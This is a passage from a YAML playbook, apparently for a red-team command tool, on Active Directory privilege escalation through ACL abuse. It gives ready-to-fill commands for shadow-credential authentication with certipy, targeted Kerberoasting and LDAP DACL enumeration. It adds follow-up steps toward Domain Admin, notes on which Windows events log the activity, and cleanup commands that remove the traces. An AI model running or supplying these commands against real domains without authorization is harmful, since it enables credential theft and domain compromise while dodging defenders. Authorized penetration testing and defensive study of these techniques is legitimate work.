      - label: "Authenticate with shadow credential"
        cmd: "certipy auth -pfx {TARGET_USER}.pfx -dc-ip {DC_IP}"
      - label: "Option C — Targeted Kerberoast (add SPN)"
        cmd: "python3 targetedKerberoast.py -d {DOMAIN} -u {USERNAME} -p '{PASSWORD}' --dc-ip {DC_IP} -t {TARGET_USER}"
      - label: "Enumerate ACLs on specific user"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M daclread -o TARGET={TARGET_USER}"
    next:
      - Use new credentials for further escalation
      - Check BloodHound for DA path from target user
      - Remove shadow credential after use
    opsec: >
      Password reset (4723) and msDS-KeyCredentialLink modification (4738)
      are logged. Shadow credentials persist across password changes.
    cleanup:
      - label: "Remove shadow credential"
        cmd: "certipy shadow remove -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -account {TARGET_USER} -dc-ip {DC_IP}"
      - label: "Remove cert files"
        cmd: "rm -f {TARGET_USER}.pfx {TARGET_USER}.ccache"

  - id: acl_genericall_group
    name: ACL Abuse — GenericAll on Group
    tab: Privilege Escalation
    requires:
